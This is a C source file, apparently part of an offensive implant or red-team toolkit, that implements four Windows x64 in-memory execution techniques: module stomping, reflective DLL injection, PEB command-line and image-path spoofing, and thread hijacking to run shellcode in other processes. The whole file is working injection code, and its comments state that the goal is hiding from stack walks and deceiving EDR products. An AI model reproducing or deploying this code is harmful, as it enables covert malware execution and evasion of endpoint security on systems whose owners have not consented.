/*
 * In-Memory Execution Engine
 *
 * Implements four in-memory code execution primitives:
 *
 *  jocky_module_stomp      – overwrite a loaded DLL in a remote process
 *  jocky_rdll_inject       – reflective DLL injection (ReflectiveLoader export)
 *  jocky_p3_poison         – process parameter poisoning (PEB CommandLine / ImagePath)
 *  jocky_thread_hijack     – hijack an existing thread's RIP in a remote process
 *
 * Windows x64 only.
 */

#ifdef _WIN32

#include "jocky_rt.h"
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>

typedef NTSTATUS (NTAPI* pNtQueryInformationProcess)(
    HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

/* ── Shared helpers ─────────────────────────────────────────────────── */

static HANDLE open_all(uint32_t pid)
{
    return OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
}

/* Search the export table of a raw PE image for a named function.
 * Returns the RVA on success, 0 if not found. */
static DWORD find_export_rva_raw(const uint8_t* base, const char* name)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    DWORD exp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                        .VirtualAddress;
    if (!exp_rva) return 0;

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(base + exp_rva);
    DWORD*  fn_tbl   = (DWORD*)(base + exp->AddressOfFunctions);
    DWORD*  name_tbl = (DWORD*)(base + exp->AddressOfNames);
    WORD*   ord_tbl  = (WORD*) (base + exp->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char* ename = (const char*)(base + name_tbl[i]);
        if (strcmp(ename, name) == 0)
            return fn_tbl[ord_tbl[i]];
    }
    return 0;
}

/* Map the sections of a raw PE image into an already-allocated remote buffer.
 * Caller must have already written the PE headers.  Returns false on any
 * WriteProcessMemory failure. */
static bool map_sections_remote(HANDLE hProc, PVOID remote_base,
                                 const uint8_t* payload)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)payload;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(payload + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    SIZE_T written = 0;

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (!sec[i].SizeOfRawData) continue;
        PVOID dst = (PBYTE)remote_base + sec[i].VirtualAddress;
        const void* src = payload + sec[i].PointerToRawData;
        if (!WriteProcessMemory(hProc, dst, src, sec[i].SizeOfRawData, &written))
            return false;
    }
    return true;
}

/* ── Module Stomping ────────────────────────────────────────────────── */

/*
 * Finds module_name in the target process's loaded module list, makes its
 * region RWX, overwrites it with payload (headers + sections), then
 * creates a remote thread at the payload's entry point.
 *
 * The stomped module's name stays in the PEB's loader list, so any stack
 * walk originating from the new code shows a legitimate module name.
 */
bool jocky_module_stomp(uint32_t pid,
                        const wchar_t* module_name,
                        const uint8_t* payload,
                        size_t payload_size)
{
    (void)payload_size;

    /* 1. Locate the module in the target process */
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32,
                                            (DWORD)pid);
    if (hSnap == INVALID_HANDLE_VALUE) return false;

    MODULEENTRY32W me = { .dwSize = sizeof(MODULEENTRY32W) };
    PVOID module_base = NULL;
    if (Module32FirstW(hSnap, &me)) {
        do {
            if (_wcsicmp(me.szModule, module_name) == 0) {
                module_base = me.modBaseAddr;
                break;
            }
        } while (Module32NextW(hSnap, &me));
    }
    CloseHandle(hSnap);
    if (!module_base) return false;

    /* 2. Parse payload headers */
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)payload;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(payload + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;

    /* 3. Make the region writable */
    HANDLE hProc = open_all(pid);
    if (!hProc) return false;

    DWORD old_prot = 0;
    VirtualProtectEx(hProc, module_base, nt->OptionalHeader.SizeOfImage,
                     PAGE_EXECUTE_READWRITE, &old_prot);

    /* 4. Write headers */
    SIZE_T written = 0;
    if (!WriteProcessMemory(hProc, module_base, payload,
                            nt->OptionalHeader.SizeOfHeaders, &written))
        goto fail;

    /* 5. Map sections */
    if (!map_sections_remote(hProc, module_base, payload))
        goto fail;

    /* 6. Launch at payload entry point */
    LPVOID ep = (PBYTE)module_base + nt->OptionalHeader.AddressOfEntryPoint;
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)ep,
                                        NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    CloseHandle(hProc);
    return (hThread != NULL);

fail:
    CloseHandle(hProc);
    return false;
}

/* ── Reflective DLL Injection ───────────────────────────────────────── */

/*
 * Injects dll_bytes into pid using the reflective loader technique.
 *
 * The DLL must export a function named "ReflectiveLoader" whose job is to
 * bootstrap the DLL in-process: apply base relocations, resolve the IAT,
 * and call DllMain.  It receives a pointer to the DLL's own base as its
 * sole argument.
 *
 * Steps:
 *  1. Allocate RWX memory in pid for the full DLL image.
 *  2. Copy the DLL bytes verbatim (file layout, not mapped layout).
 *  3. Locate the ReflectiveLoader export RVA inside the raw bytes.
 *  4. CreateRemoteThread at remote_base + rl_rva; pass remote_base as arg.
 *
 * Returns false if dll_bytes has no "ReflectiveLoader" export.
 */
bool jocky_rdll_inject(uint32_t pid, const uint8_t* dll_bytes, size_t dll_size)
{
    /* Locate ReflectiveLoader before we touch the target process */
    DWORD rl_rva = find_export_rva_raw(dll_bytes, "ReflectiveLoader");
    if (!rl_rva) return false;

    HANDLE hProc = open_all(pid);
    if (!hProc) return false;

    PVOID remote = VirtualAllocEx(hProc, NULL, dll_size,
                                  MEM_COMMIT | MEM_RESERVE,
                                  PAGE_EXECUTE_READWRITE);
    if (!remote) { CloseHandle(hProc); return false; }

    SIZE_T written = 0;
    if (!WriteProcessMemory(hProc, remote, dll_bytes, dll_size, &written)) {
        VirtualFreeEx(hProc, remote, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return false;
    }

    /* ReflectiveLoader receives the DLL's remote base as its argument */
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
                         (LPTHREAD_START_ROUTINE)((uint8_t*)remote + rl_rva),
                         remote, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    CloseHandle(hProc);
    return (hThread != NULL);
}

/* ── Process Parameter Poisoning (P³) ──────────────────────────────── */

/*
 * Overwrites the PEB's RTL_USER_PROCESS_PARAMETERS.CommandLine and/or
 * ImagePathName in the target process.  EDRs that inspect these fields via
 * ReadProcessMemory will see the spoofed values.
 *
 * On 64-bit Windows 10+:
 *   PEB.ProcessParameters            at PEB+0x20 (pointer)
 *   RTL_USER_PROCESS_PARAMETERS
 *     .ImagePathName (UNICODE_STRING) at params+0x60
 *     .CommandLine   (UNICODE_STRING) at params+0x70
 *
 * UNICODE_STRING layout (64-bit):
 *   +0x00  Length          (USHORT, bytes, not including NUL)
 *   +0x02  MaximumLength   (USHORT)
 *   +0x04  (padding)
 *   +0x08  Buffer          (PWSTR, 8-byte pointer)
 *
 * Each changed string is written into a freshly-allocated PAGE_READWRITE
 * region in the target so we never corrupt existing memory.
 */
bool jocky_p3_poison(uint32_t pid,
                     const wchar_t* fake_cmdline,
                     const wchar_t* fake_image_path)
{
    if (!fake_cmdline && !fake_image_path) return true;

    HANDLE hProc = open_all(pid);
    if (!hProc) return false;

    /* Get PEB base */
    HMODULE hNt = GetModuleHandleA("ntdll.dll");
    pNtQueryInformationProcess NtQIP =
        (pNtQueryInformationProcess)GetProcAddress(hNt, "NtQueryInformationProcess");

    PROCESS_BASIC_INFORMATION pbi = {0};
    ULONG ret_len = 0;
    if (NtQIP(hProc, ProcessBasicInformation, &pbi, sizeof(pbi), &ret_len)) {
        CloseHandle(hProc);
        return false;
    }

    /* Read PEB.ProcessParameters pointer (PEB+0x20 on x64) */
    PVOID params_ptr = NULL;
    SIZE_T bytes_read = 0;
    if (!ReadProcessMemory(hProc,
                           (PBYTE)pbi.PebBaseAddress + 0x20,
                           &params_ptr, sizeof(params_ptr), &bytes_read)) {
        CloseHandle(hProc);
        return false;
    }

    bool ok = true;

    /* Helper lambda (as a macro): patch one UNICODE_STRING field */
#define PATCH_USTR(field_offset, new_str) do {                             \
    size_t _wlen   = wcslen(new_str);                                      \
    size_t _blen   = (_wlen + 1) * sizeof(wchar_t);                       \
    PVOID  _nbuf   = VirtualAllocEx(hProc, NULL, _blen,                   \
                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);         \
    if (!_nbuf) { ok = false; break; }                                     \
    WriteProcessMemory(hProc, _nbuf, new_str, _blen, NULL);               \
    USHORT _len16  = (USHORT)(_wlen * sizeof(wchar_t));                   \
    USHORT _mlen16 = (USHORT)_blen;                                       \
    WriteProcessMemory(hProc, (PBYTE)params_ptr+(field_offset)+0, &_len16,  2, NULL); \
    WriteProcessMemory(hProc, (PBYTE)params_ptr+(field_offset)+2, &_mlen16, 2, NULL); \
    WriteProcessMemory(hProc, (PBYTE)params_ptr+(field_offset)+8, &_nbuf,   8, NULL); \
} while (0)

    if (fake_image_path) PATCH_USTR(0x60, fake_image_path);
    if (fake_cmdline)    PATCH_USTR(0x70, fake_cmdline);

#undef PATCH_USTR

    CloseHandle(hProc);
    return ok;
}

/* ── Thread Execution Hijacking ─────────────────────────────────────── */

/*
 * Finds the first non-current thread in pid, suspends it, redirects its
 * instruction pointer to an injected shellcode copy, then resumes.
 *
 * The original thread continues executing the shellcode when resumed.
 * Control is not returned to the original RIP after the shellcode runs
 * unless the shellcode explicitly restores it.
 *
 * Shellcode is copied to a fresh RWX allocation in the target.
 */
bool jocky_thread_hijack(uint32_t pid,
                          const uint8_t* shellcode,
                          size_t shellcode_size)
{
    /* 1. Find a thread belonging to pid */
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return false;

    DWORD target_tid = 0;
    THREADENTRY32 te = { .dwSize = sizeof(THREADENTRY32) };
    if (Thread32First(hSnap, &te)) {
        do {
            if (te.th32OwnerProcessID == (DWORD)pid &&
                te.th32ThreadID != GetCurrentThreadId()) {
                target_tid = te.th32ThreadID;
                break;
            }
        } while (Thread32Next(hSnap, &te));
    }
    CloseHandle(hSnap);
    if (!target_tid) return false;

    /* 2. Inject shellcode into target */
    HANDLE hProc = open_all(pid);
    if (!hProc) return false;

    PVOID remote_sc = VirtualAllocEx(hProc, NULL, shellcode_size,
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_EXECUTE_READWRITE);
    if (!remote_sc) { CloseHandle(hProc); return false; }

    SIZE_T written = 0;
    if (!WriteProcessMemory(hProc, remote_sc, shellcode, shellcode_size, &written)) {
        VirtualFreeEx(hProc, remote_sc, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return false;
    }

    /* 3. Suspend, redirect RIP, resume */
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, target_tid);
    if (!hThread) {
        VirtualFreeEx(hProc, remote_sc, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return false;
    }

    SuspendThread(hThread);

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    bool ok = false;
    if (GetThreadContext(hThread, &ctx)) {
        ctx.Rip = (DWORD64)(uintptr_t)remote_sc;
        ok = SetThreadContext(hThread, &ctx);
    }

    ResumeThread(hThread);

    CloseHandle(hThread);
    CloseHandle(hProc);
    return ok;
}

#endif /* _WIN32 */
